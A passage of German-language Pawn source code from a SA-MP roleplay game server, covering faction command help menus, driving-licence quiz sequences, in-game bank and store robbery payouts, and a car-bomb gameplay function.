		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION  ( Carrespawn (Leader) ");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(gTeam[playerid] == 1 || PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4)
	{
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION (/r)adio (/d)epartments /sheal /duty /wiederbeleben /sellpaket /setrangname");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 5 || PlayerInfo[playerid][pLeader] == 5)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /invade /ctf /mv /kidnap /gangjail /gangunjail /mundtape /tie /untie /durchsuchen");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /augenbinde  /ausruesten) /setrangname");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pLeader] == 6)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /tie /untie /invade /ctf /yaktor /yaktor2 /kidnap /gangjail /gangunjail /tie /untie /mundtape");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /durchsuchen /augenbinde  /ausruesten /setrangname /mv");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 7 || PlayerInfo[playerid][pLeader] == 7)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /settax /givetax /präsibüro /setrangname");
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /contracts /mv /tie /untie /kidnap /gangjail /gangunjail /mundtape");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /durchsuchen /augenbinde  /ausruesten /setrangname");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /paper /papers /live /news [text] /mv /setrangname /mv /delnewsrb /newsrb /givepaper");
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pLeader] == 10)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /f /setrangname /mv /petrol");
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /startlesson /stoplesson /givelicense /lehrerlift /licensepreise /setrangname /mv");
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /invade /ctf /kidnap /gangjail /gangunjail /mundtape /tie /untie /durchsuchen");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /augenbinde  /ausruesten /setrangname /mv");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 13 || PlayerInfo[playerid][pLeader] == 13)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /invade /ctf /gexit /kidnap /gangjail /gangunjail /mundtape /tie /untie /durchsuchen");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /augenbinde  /ausruesten /setrangname /mv");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 14 || PlayerInfo[playerid][pLeader] == 14)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /invade /ctf /kidnap /gangjail /gangunjail /mundtape /tie /untie /durchsuchen");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /augenbinde  /ausruesten /setrangname /mv");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pLeader] == 15)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /invade /ctf Enter /kidnap /gangjail /gangunjail /tie /untie /mundtape /durchsuchen");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /augenbinde  /ausruesten /setrangname /mv");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 16 || PlayerInfo[playerid][pLeader] == 16)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION  /invade /ctf /kidnap /gangjail /tie /untie /gangunjail /mundtape /durchsuchen");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION  /augenbinde  /ausruesten /setrangname /mv");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pLeader] == 17 || PlayerInfo[playerid][pMember] == 17)
	{
	    SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION   Enter /invade /ctf /kidnap /gangjail /tie /untie /gangunjail /mv");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION  /mundtape /durchsuchen /augenbinde  /ausruesten /setrangname");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 18 || PlayerInfo[playerid][pLeader] == 18)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION  /invade /ctf /kidnap /tie /untie /gangjail /gangunjail /mv");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION  /mundtape /durchsuchen /augenbinde  /ausruesten /setrangname");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 19 || PlayerInfo[playerid][pLeader] == 19)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /invade /ctf /setrangname /mv");
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION  /bombelegen (autobombe) /setrangname /mv /bombe");
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pLeader] == 22)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /fsperre /gov /rb /rbb /sperrewegall /orten /tazer /nb /nbw /setrangname /mv");
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 23 || PlayerInfo[playerid][pLeader] == 23)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /invade /ctf /mv /tie /untie /mv");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /augenbinde 1/0 /kidnap /angriff /setrangname");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 21 || PlayerInfo[playerid][pLeader] == 21)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION  /freefromcar /freilassen /wmaske /mv /reinziehen /tie /untie /kidnap /setrangname /mv");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION  /gangjail /gangunjail /mundtape /durchsuchen /augenbinde  /ausruesten");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(PlayerInfo[playerid][pMember] == 24 || PlayerInfo[playerid][pLeader] == 24)
	{
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /mv /ticket /m /tazer /blitzer /setrangname /repair /opark /carinfo");
    	SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(GetPlayerFaction(playerid) == 21)
	{
	    SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /freefromcar /freilassen /wmaske /whtor /reinziehen /tie /setrangname /mv");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /untie /kidnap /gangjail /gangunjail /mundtape /durchsuchen /augenbinde  /ausruesten");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	else if(IsAGang(playerid))
	{
	    SendClientMessage(playerid, COLOR_GRAD5,"FRAKTION  /kidnap /invade /ctf /gangjail /gangunjail /mundtape /durchsuchen (nach Geld)");
		SendClientMessage(playerid, COLOR_GRAD5,"FRAKTION /augenbinde  /ausruesten /setrangname /mv");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /buycar");
	}
	return 1;
}
Function ClearChatbox(playerid,lines)
{
	if(IsPlayerConnected(playerid) && lines > 0)
	{
		for(new l=0; l<lines; l++)
		{
	    	SendClientMessage(playerid,COLOR_WHITE," ");
	    }
	}
}

Function Motorrad(playerid)
{
	MotorradSchritt[playerid]++;
	if(MotorradSchritt[playerid] == 2)
	{
	    for(new msg=0; msg<50; msg++) SendClientMessage(playerid,COLOR_WHITE," ");
		GameTextForPlayer(playerid,"~w~WILLKOMMEN",5000,3);
		SendClientMessage(playerid,COLOR_LIGHTBLUE, "Willkommen bei der schnellen Fahrschule von GTA-City Reallife");
		SendClientMessage(playerid,COLOR_LIGHTBLUE, "Dir werden jetzt auf die Schnelle die Grundregeln beigebracht.Kurz gesagt Straßenverkehrsordnung.");
	}
	else if(MotorradSchritt[playerid] == 10)
	{
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"Da du dich für den Motorrad Führerschein entschieden hast folgen gleich ein Paar Fragen");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"Es geht um Grundwissen fragen die man eigentlich Problemlos kenne sollte");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du darfst als Motorrad Fahrer in der Stadt nur 80Km/h fahren.Ausserhalb Unbegrenzt");
	}
	else if(MotorradSchritt[playerid] == 25)
	{
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"Die Straßenverkehrsordnung ist einzuhalten. Die einzigen die diese nicht beachten dürfen sind Sanitäter");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"Mit einem Motorrad musst du innerhalb der Stadt langsam beschleunigen.");
	}
	else if(MotorradSchritt[playerid] == 40)
	{
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"An deinem Motorrad muss immer alles Funktionieren. Und du musst alle Papiere dabei haben");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"bezüglich des Motorrads");
	}
	else if(MotorradSchritt[playerid] == 50)
	{
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"Die Prüfung beginnt jetzt. Das Admin Team wünscht dir Viel Glück");
	}
	else if(MotorradSchritt[playerid] == 60)
	{
 		for(new msg=0; msg<50; msg++) SendClientMessage(playerid,COLOR_WHITE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Frage 1:");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"  Was musst du immer mit dir führen?");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   a) Kondome");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   b) Lizenz & Personalausweiß");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   c) Zigaretten");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   d) Deospray");
	    ShowMenuForPlayer(MotorradMenu,playerid);
	    KillTimer(MotorradTimer[playerid]);
	}
	else if(MotorradSchritt[playerid] == 80)
	{
		for(new msg=0; msg<50; msg++) SendClientMessage(playerid,COLOR_WHITE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Frage 2:");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"  Was muss an deinem Fahrzeug Funktionieren?");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   a) Die Hupe ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   b) Die Dekoration");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   c) Alles");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   d) Der Motor");
	    ShowMenuForPlayer(MotorradMenu,playerid);
	    KillTimer(MotorradTimer[playerid]);
	}
	else if(MotorradSchritt[playerid] == 100)
	{
		for(new msg=0; msg<50; msg++) SendClientMessage(playerid,COLOR_WHITE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Frage 3:");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"  Wie beschleunigt man in einer Stadt?");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   a) Langsam");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   b) Schnell");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   c) Egal Hauptsache man fährt");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   d) Garnicht");
	    ShowMenuForPlayer(MotorradMenu,playerid);
	    KillTimer(MotorradTimer[playerid]);
	}
	else if(MotorradSchritt[playerid] == 120)
	{
		for(new msg=0; msg<50; msg++) SendClientMessage(playerid,COLOR_WHITE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Frage 2:");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"  Wer darf die Verkehrsregeln missachten?");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   a) Niemand");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   b) Nur ich");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   c) Beamte in Not");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   d) Der Pizzaservice");
	    ShowMenuForPlayer(MotorradMenu,playerid);
	    KillTimer(MotorradTimer[playerid]);
	}
	else if(MotorradSchritt[playerid] == 125)
	{
 		for(new msg=0; msg<50; msg++) SendClientMessage(playerid,COLOR_WHITE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Du hast nun den Motorrad Führerschein!");
	    PlayerInfo[playerid][pMotoLic] = 1;
	    MotorradSchritt[playerid] = 0;
	    UnFreezePlayer(playerid);
    	SetPlayerPosEx(playerid,364.3931,173.7390,1008.3828,180.0000);
	    SetCameraBehindPlayer(playerid);
	    KillTimer(MotorradTimer[playerid]);
	}

	return 1;
}

Function OnPlayerPruefung(playerid)
{
    PruefungsSchritt[playerid]++;
	if(PruefungsSchritt[playerid] == 2)
	{
	    for(new msg=0; msg<50; msg++) SendClientMessage(playerid,COLOR_WHITE," ");
	    GameTextForPlayer(playerid,"~w~WILLKOMMEN",5000,3);
		SendClientMessage(playerid,COLOR_LIGHTBLUE," Willkommen bei der schnellen Fahrschule von GTA-City Reallife");
		SendClientMessage(playerid,COLOR_LIGHTBLUE," Dir werden jetzt auf die Schnelle die Grundregeln beigebracht.Kurz gesagt Straßenverkehrsordnung.");
	}
	else if(PruefungsSchritt[playerid] == 10)
	{
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Bei uns gild meistens die Rechts vor Links Regel. Es sei denn es ist mit Ampeln geregelt.");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Die einzigen die diese Regeln missachten dürfen sind Staatsbeamte die im Dienst sind!");
	}
	else if(PruefungsSchritt[playerid] == 25)
	{
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Notfallwagen mit Sirenen haben immer fortfahrt.");
	}
	else if(PruefungsSchritt[playerid] == 40)
	{
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Solltest du in eine Verkehrskontrolle geraten, musst du Rechts ranfahren und die Anweisungen der Beamten befolgen.");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Nützliche Befehle: /scheine oder /show.");
	}
	else if(PruefungsSchritt[playerid] == 58)
	{
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Damit dein Fahrzeug auch nicht sinnlos herumsteht und auch");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," nicht abgeschleppt wird, musst du es Ordnungsgemäß Parken.");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Park es am besten auf einem Parkplatz.");
	}
	else if(PruefungsSchritt[playerid] == 72)
	{
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Wir hoffen du hast dir alles gut gemerkt,");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Die Prüfung geht sofort los. Das Admin Team wünscht dir Viel Glück!");
	}
	else if(PruefungsSchritt[playerid] == 90)
	{
	    for(new msg=0; msg<50; msg++) SendClientMessage(playerid,COLOR_WHITE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Frage 1:");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"  Welche Vorfahrtsregel gilt auf diesem Server?");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   a) Beste vor Schlechteste");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   b) Garkeine");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   c) Rechts vor Links");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   d) Links vor Rechts");
	    ShowMenuForPlayer(PruefungMenu,playerid);
	    KillTimer(PruefungsTimer[playerid]);
	}
	else if(PruefungsSchritt[playerid] == 100)
	{
	    for(new msg=0; msg<50; msg++) SendClientMessage(playerid,COLOR_WHITE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Frage 2:");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"  Was machst du wenn ein Beamter dir ein Beamter in Not Begegnet?");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   a) Ich fahre ganz normal weiter");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   b) Auf der Straße Parken");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   c) Rechts ran fahren und vorbei lassen");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   d) Fenster runter und Winken");
	    ShowMenuForPlayer(PruefungMenu,playerid);
	    KillTimer(PruefungsTimer[playerid]);
	}
	else if(PruefungsSchritt[playerid] == 110)
	{
	    for(new msg=0; msg<50; msg++) SendClientMessage(playerid,COLOR_WHITE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Frage 3:");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"  Was machst du wenn eine Ampel Rot anzeigt?");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   a) Ich halte an.");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   b) Ich halte und warte bis sie Grün aufleuchtet");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   c) Ich parke mein Auto und steige aus");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   d) Ich fahre einfach weiter");
	    ShowMenuForPlayer(PruefungMenu,playerid);
	    KillTimer(PruefungsTimer[playerid]);
	}
	else if(PruefungsSchritt[playerid] == 120)
	{
	    for(new msg=0; msg<50; msg++) SendClientMessage(playerid,COLOR_WHITE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Frage 4:");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"  Wie Schnell darfst du in einer Spielstraße fahren?(Grundwissen)");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   a) 50-80");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   b) Schnell");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   c) Langsam");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE,"   d) Schrittgeschwindigkeit");
	    ShowMenuForPlayer(PruefungMenu,playerid);
	    KillTimer(PruefungsTimer[playerid]);
	}
	else if(PruefungsSchritt[playerid] == 125)
	{
	    for(new msg=0; msg<50; msg++) SendClientMessage(playerid,COLOR_WHITE," ");
	    SendClientMessage(playerid,COLOR_LIGHTBLUE," Du hast nun den Führerschein!");
	    PlayerInfo[playerid][pCarLic] = 1;
	    PruefungsSchritt[playerid] = 0;
	    UnFreezePlayer(playerid);
    	SetPlayerPosEx(playerid,364.3931,173.7390,1008.3828,180.0000);
	    SetCameraBehindPlayer(playerid);
	    KillTimer(PruefungsTimer[playerid]);
	}

	return 1;
}

Function OnPlayerFailedPruefung(playerid)
{
	GameTextForPlayer(playerid,"~r~DURCHGEFALLEN",5000,3);
	SendClientMessage(playerid,COLOR_RED," Du bist leider durchgefallen. Versuche es beim nächsten mal besser.");
    UnFreezePlayer(playerid);
    SetPlayerPosEx(playerid,364.3931,173.7390,1008.3828,180.0000);
    SetCameraBehindPlayer(playerid);
	return 1;
}

Function RemoveRoadblock(playerid)
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerInfo[i][pMember] == 1 || PlayerInfo[i][pLeader] == 1)
			{
				DisablePlayerCheckpoint(i);
			}
		}
	}
	DestroyDynamicObject(PlayerInfo[playerid][pRoadblock]);
	PlayerInfo[playerid][pRoadblock] = 0;
	return 1;
}



Function BombeBOOM(playerid,vid)
{

   	if(vid != INVALID_VEHICLE_ID)
   	{
     	if(playerid != INVALID_PLAYER_ID)
      	{
      	    new fid = PlayerInfo[playerid][sMember];
      	    new Float:boomx, Float:boomy, Float:boomz;
			GetVehiclePos(vid,boomx, boomy, boomz);
			CreateExplosion(boomx, boomy , boomz, 7, 20);
			SCM(playerid,-1,"BOOOOOM!");

			FrakInfo[fid][BombeAutoID] = INVALID_VEHICLE_ID;
			FrakInfo[fid][BombeVon] = INVALID_PLAYER_ID;


			return 1;
      	}
	}
	return 1;
}


Function MullabfuhrAbbruch(playerid)
{
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 408)
	{
		SendClientMessage(playerid, COLOR_RED, "Du bist nicht in das Fahrzeug zurückgekehrt!");
		DisablePlayerCheckpoint(playerid);
		Mullabfuhr[playerid] = 0;
	}
	return 1;
}

Function ticketsys(string[])
{
	new eintragen[256];
	format(eintragen, sizeof(eintragen), "%s\n",string);
	new File:hFile;
	hFile = fopen("tickets.log", io_append);
	fwrite(hFile, eintragen);
	fclose(hFile);
}

Function UnsetStuntVar(playerid)
{
	StuntVar[playerid] = 1;
	return 1;
}


Function Rep(playerid,veh,Float:vehX,Float:vehY,Float:vehZ,Float:vehA)
{
    SetVehiclePos(veh,vehX,vehY,vehZ);
    SetVehicleZAngle(veh,vehA);
    PutPlayerInVehicle(playerid,veh,0);
    UnFreezePlayer(playerid);
    SendClientMessage(playerid,COLOR_GREEN," Du hast dein Fahrzeug auf Kosten des Staats tanken und reparieren lassen!");
//    Gas[veh] = GetGasMax(GetVehicleModel(veh));
	LinkVehicleToInterior(veh,0);
	SetPlayerInterior(playerid,0);
	PlayerInfo[playerid][pInt] = 0;
	return 1;
}


stock strvalEx( const string[] )
{
	if( strlen( string ) >= 50 ) return 0;
	return strval(string);
}

Function UnFreeze(playerid)
{
	TogglePlayerControllable(playerid, 1);
	return 1;
}


Function Rob_Resetls()
{
	robls = 0;
	return 1;
}
Function Rob_Resetsf()
{
	robsf = 0;
	return 1;
}
Function Rob_Resetlv()
{
	roblv = 0;
	return 1;
}


Function Rob_Cop(playerid)
{
	if(PlayerInfo[playerid][pLocal] == 102)
	{
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i))
			{
			    if(IsACop(i))
			    {
					new sendername[MAX_PLAYER_NAME],string[123];
					GetPlayerName(playerid,sendername,sizeof(sendername));
					SendClientMessage(i,TEAM_BLUE_COLOR,"HQ: Achtung! Das Bank Security System konnte den Täter identifizieren!");
					format(string,sizeof(string),"HQ: Der Täter heißt %s und befindet sich noch in der Bank!",sendername);
					SendClientMessage(i,TEAM_BLUE_COLOR,string);
				}
			}
		}
	}
	else if(PlayerInfo[playerid][pLocal] == 102)
	{
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i))
			{
			    if(IsACop(i))
			    {
					new sendername[MAX_PLAYER_NAME],string[123];
					GetPlayerName(playerid,sendername,sizeof(sendername));
					SendClientMessage(i,TEAM_BLUE_COLOR,"HQ: Achtung! Das Bank Security System  konnte den Täter identifizieren!");
					format(string,sizeof(string),"HQ: Der Täter heißt %s und befindet sich nicht mehr in der Tankstelle!",sendername);
					SendClientMessage(i,TEAM_BLUE_COLOR,string);
				}
			}
		}
	}
}






Function robstore(playerid)// Banküberfall ist gescheitert, Geld aus dem 24/7 entziehen
{
	if(IsPlayerInRangeOfPoint(playerid,35.0,2.5036,-28.5656,1003.5494))//2316.1729,-7.1389,26.7422))
	{
		if(PlayerInfo[playerid][pRobstore] == 1)
		{
        PlayerInfo[playerid][pRobstore] = 0;
	    }
		new randmoney = 10000+ random(20000);
		GivePlayerMoneySave(playerid,randmoney);

		BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] -= randmoney;
		new string[128];
		format(string,sizeof(string),"Du hast $%d erbeutet! Nun verschwinde! Aber schnell!",randmoney);
		SendClientMessage(playerid,COLOR_GREEN,string);
//		SetTimerEx("Rob_Cop",80000+random(90000),0,"i",playerid); // Nach 1 minute
        new name[128];
        GetPlayerName(playerid, name, sizeof(name));

		new LocationZone[MAX_ZONE_NAME];
		Get2DZone(BizzInfo[PlayerInfo[playerid][pLocal]-99][bEntranceX],BizzInfo[PlayerInfo[playerid][pLocal]-99][bEntranceY], LocationZone, MAX_ZONE_NAME);


	    format(string, sizeof(string), "<< %s hat den 24/7 in %s erfolgreich ausgeraubt und %d erbeutet >>",name,LocationZone,randmoney);
	    OOCNews(COLOR_LIGHTRED, string);

	}
	else
	{
        SendClientMessage(playerid,0xAA3333AA," Du hast den Laden verlassen und bekommst keine Kohle!");
        return 1;
    }
	return 1;
}









Function Rob_UnFreeze(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid,35.0,1425.4913,-991.7953,1639.7843))//2316.1729,-7.1389,26.7422))
	{
		if(PlayerInfo[playerid][pBankrob] == 2)
		{
        PlayerInfo[playerid][pBankrob] = 0;
        return 1;
	    }
		if(PlayerInfo[playerid][pBankrob] == 1)
		{
        PlayerInfo[playerid][pBankrob] = 0;
	    }
		new randmoney = 50000+ random(60000);
		GivePlayerMoneySave(playerid,randmoney);
		FraktionsKasse[6] -= randmoney;// Regierung
		new string[128];
		format(string,sizeof(string),"Du hast $%d erbeutet! Nun verschwinde! Aber schnell!",randmoney);
		SendClientMessage(playerid,COLOR_GREEN,string);
		SetTimerEx("Rob_Cop",80000+random(90000),0,"i",playerid); // Nach 1 minute
        new name[128];
        GetPlayerName(playerid, name, sizeof(name));
	    if(GetPlayerVirtualWorld(playerid) == 2)
	    {//LS
	        format(string, sizeof(string), "<< %s hat die Bank in Los Santos erfolgreich ausgeraubt und %d erbeutet >>",name,randmoney);
	        OOCNews(COLOR_LIGHTRED, string);
	        }
	        else if(GetPlayerVirtualWorld(playerid) == 3)
	        {//LS
	        format(string, sizeof(string), "<< %s hat die Bank in San Fierro erfolgreich ausgeraubt und %d erbeutet >>",name,randmoney);
	        OOCNews(COLOR_LIGHTRED, string);
	        }
	        else if(GetPlayerVirtualWorld(playerid) == 4)
	        {//LS
	        format(string, sizeof(string), "<< %s hat die Bank in Las Venturas erfolgreich ausgeraubt und %d erbeutet >>",name,randmoney);
	        OOCNews(COLOR_LIGHTRED, string);
	    }
	}
	else
	{
        SendClientMessage(playerid,0xAA3333AA," Du hast die Bank verlassen und bekommst keine Kohle!");
        return 1;
    }
	return 1;
}
Function UnSetWeaps(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		WeapsTaken[playerid] = 0;
	}
	return 1;
}

//sanft rotieren
Function MoveObjektRot(oid,Float:rx, Float:ry, Float:rz, geschw) {
	new Float:x, Float:y, Float:z, Float:dx, Float:dy, Float:dz;
	GetObjectRot(oid,x,y,z);
	dx=(rx-x)/geschw;
	dy=(ry-y)/geschw;
	dz=(rz-z)/geschw;
	SetObjectRot(oid,x+dx,y+dy,z+dz);
	geschw--;
	SetTimerEx("MoveRot",50,0,"dfffdfff",oid,rx,ry,rz,geschw,dx,dy,dz);
	return 1;
}
Function MoveRot(oid,Float:rx, Float:ry, Float:rz, geschw, Float:dx, Float:dy, Float:dz) {
	new Float:x, Float:y, Float:z;
	GetObjectRot(oid,x,y,z);
	SetObjectRot(oid,x+dx,y+dy,z+dz);
	geschw--;
	if(geschw>=1) {
	SetTimerEx("MoveRot",50,0,"dfffdfff",oid,rx,ry,rz,geschw,dx,dy,dz); }
	return 1;
}

Function TazerBereitForPlayer(playerid)
{
	TazerBereit[playerid] = 1;
	return 1;
}


Function OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	if(IsACop(playerid))
	{
